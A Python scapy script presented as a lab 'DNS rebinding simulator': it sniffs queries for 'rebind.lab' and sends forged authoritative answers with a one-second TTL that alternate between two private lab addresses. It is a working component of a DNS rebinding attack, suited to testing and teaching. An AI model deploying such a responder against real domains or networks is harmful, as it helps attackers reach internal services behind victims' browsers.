from scapy.all import (
    IP,
    UDP,
    DNS,
    DNSQR,
    DNSRR,
    sniff,
    send
)

# ============================================================
# CONFIGURATION
# ============================================================

INTERFACE = "eth1"

DOMAIN = "rebind.lab"

PUBLIC_IP = "192.168.56.200"
INTERNAL_IP = "192.168.56.105"

DNS_PORT = 5353

QUERY_COUNT = 20


# ============================================================
# DNS REBINDING SIMULATION
# ============================================================

print("=" * 60)
print("          DNS REBINDING SIMULATOR")
print("=" * 60)

print(f"Domain       : {DOMAIN}")
print(f"First answer : {PUBLIC_IP}")
print(f"Second answer: {INTERNAL_IP}")
print("=" * 60)


query_number = 0


def answer_dns(packet):

    global query_number

    if not packet.haslayer(DNSQR):
        return

    query_name = packet[DNSQR].qname.decode(errors="ignore")

    if not query_name.startswith(DOMAIN):
        return

    query_number += 1

    # Alternate between the two addresses.
    if query_number % 2 == 1:
        answer_ip = PUBLIC_IP
    else:
        answer_ip = INTERNAL_IP

    response = (
        IP(
            dst=packet[IP].src,
            src=packet[IP].dst
        )
        /
        UDP(
            dport=packet[UDP].sport,
            sport=DNS_PORT
        )
        /
        DNS(
            id=packet[DNS].id,
            qr=1,
            aa=1,
            qd=packet[DNS].qd,
            an=DNSRR(
                rrname=packet[DNSQR].qname,
                ttl=1,
                type="A",
                rdata=answer_ip
            )
        )
    )

    send(
        response,
        iface=INTERFACE,
        verbose=False
    )

    print(
        f"[DNS] Query {query_number:02d} "
        f"{query_name} → {answer_ip}"
    )


print("\n[*] Waiting for DNS queries...")
print("[*] Press Ctrl+C to stop.\n")

try:

    sniff(
        iface=INTERFACE,
        filter=f"udp port {DNS_PORT}",
        prn=answer_dns,
        store=False
    )

except KeyboardInterrupt:

    print("\n[*] DNS rebinding simulator stopped.")
